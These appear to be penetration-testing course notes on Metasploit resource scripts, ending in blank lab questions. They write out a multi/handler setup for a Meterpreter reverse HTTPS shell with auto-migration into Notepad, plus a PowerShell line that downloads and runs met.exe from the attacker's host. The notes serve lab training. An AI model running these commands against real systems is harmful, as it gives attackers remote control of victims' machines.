# Resource Scripts

Activate module, set payload, and options
>``` shell
>use exploit/multi/handler
>set PAYLOAD windows/meterpreter_reverse_https
>set LHOST 192.168.119.4
>set LPORT 443
>```

Set AutoRunScript to the migrate module
>``` shell
>set AutoRunScript post/windows/manage/migrate 
>```

Set ExitOnSession to false to keep the multi/handler listening after a connection
>``` shell
>set ExitOnSession false
>```

Command to launch the module
>``` shell
>run -z -j
>```

Executing the resource script
>``` shell
>kali@kali:~$ sudo msfconsole -r listener.rc
>
># ========== Expected Result ==========
>[sudo] password for kali:
>...
>[*] Processing listener.rc for ERB directives.
>resource (listener.rc)> use exploit/multi/handler
>[*] Using configured payload generic/shell_reverse_tcp
>resource (listener.rc)> set PAYLOAD windows/meterpreter/reverse_https
>PAYLOAD => windows/meterpreter/reverse_https
>resource (listener.rc)> set LHOST 192.168.119.4
>LHOST => 192.168.119.4
>resource (listener.rc)> set LPORT 443
>LPORT => 443
>resource (listener.rc)> set AutoRunScript post/windows/manage/migrate
>AutoRunScript => post/windows/manage/migrate
>resource (listener.rc)> set ExitOnSession false
>ExitOnSession => false
>resource (listener.rc)> run -z -j
>[*] Exploit running as background job 0.
>[*] Exploit completed, but no session was created.
>msf6 exploit(multi/handler) > 
>[*] Started HTTPS reverse handler on https://192.168.119.4:443
># =====================================
>```

Executing the Windows executable containing the Meterpreter payload
>``` shell
>PS C:\Users\justin> iwr -uri http://192.168.119.4/met.exe -Outfile met.exe
>
>PS C:\Users\justin> .\met.exe
>```

Incoming connection and successful migration to a newly spawned Notepad process
>``` shell
>[*] Started HTTPS reverse handler on https://192.168.119.4:443
>[*] https://192.168.119.4:443 handling request from 192.168.50.202; (UUID: rdhcxgcu) Redirecting stageless connection from /dkFg_HAPAAB9KHwqH8FRrAG1_y2iZHe4AJlyWjYMllNXBbFbYBVD2rlxUUDdTrFO7T2gg6ma5cI-GahhqTK9hwtqZvo9KJupBG7GYBlYyda_rDHTZ1aNMzcUn1x with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0'
>[*] https://192.168.119.4:443 handling request from 192.168.50.202; (UUID: rdhcxgcu) Attaching orphaned/stageless session...
>[*] Session ID 1 (192.168.119.4:443 -> 127.0.0.1) processing AutoRunScript 'post/windows/manage/migrate'
>[*] Running module against BRUTE2
>[*] Current server process: met.exe (2004)
>[*] Spawning notepad.exe process to migrate into
>[*] Spoofing PPID 0
>[*] Migrating into 5340
>[+] Successfully migrated into process 5340
>[*] Meterpreter session 1 opened (192.168.119.4:443 -> 127.0.0.1) at 2022-08-02 09:54:32 -0400
>```

Listing all resource scripts provided by Metasploit
>``` shell
>kali@kali:~$ ls -l /usr/share/metasploit-framework/scripts/resource
>
># ========== Expected Result ==========
>total 148
>-rw-r--r-- 1 root root  7270 Jul 14 12:06 auto_brute.rc
>-rw-r--r-- 1 root root  2203 Jul 14 12:06 autocrawler.rc
>-rw-r--r-- 1 root root 11225 Jul 14 12:06 auto_cred_checker.rc
>-rw-r--r-- 1 root root  6565 Jul 14 12:06 autoexploit.rc
>-rw-r--r-- 1 root root  3422 Jul 14 12:06 auto_pass_the_hash.rc
>-rw-r--r-- 1 root root   876 Jul 14 12:06 auto_win32_multihandler.rc
>...
>-rw-r--r-- 1 root root  2419 Jul 14 12:06 portscan.rc
>-rw-r--r-- 1 root root  1251 Jul 14 12:06 run_all_post.rc
>-rw-r--r-- 1 root root  3084 Jul 14 12:06 smb_checks.rc
>-rw-r--r-- 1 root root  3837 Jul 14 12:06 smb_validate.rc
>-rw-r--r-- 1 root root  2592 Jul 14 12:06 wmap_autotest.rc
># =====================================
>```

Lab 1 - Follow the steps outlined in this section and use a resource script to set up a multi/handler. Obtain a Meterpreter session from VM #1. In addition, review the provided resource scripts. What is the command line option of msfconsole to specify the use of a resource script?
>``` shell
>
>```
>

Lab 2 - The provided resource script portscan.rc by Metasploit scans various ports in the default configuration. What is the number of the first port?
>``` shell
>
>```
>

Lab 3 - Capstone Exercise: Use the methods and techniques from this Module to enumerate VM Group 1. Get access to both machines and find the flag. Once the VM Group is deployed, please wait two more minutes for one of the web applications to be fully initialized.
>``` shell
>
>```
>
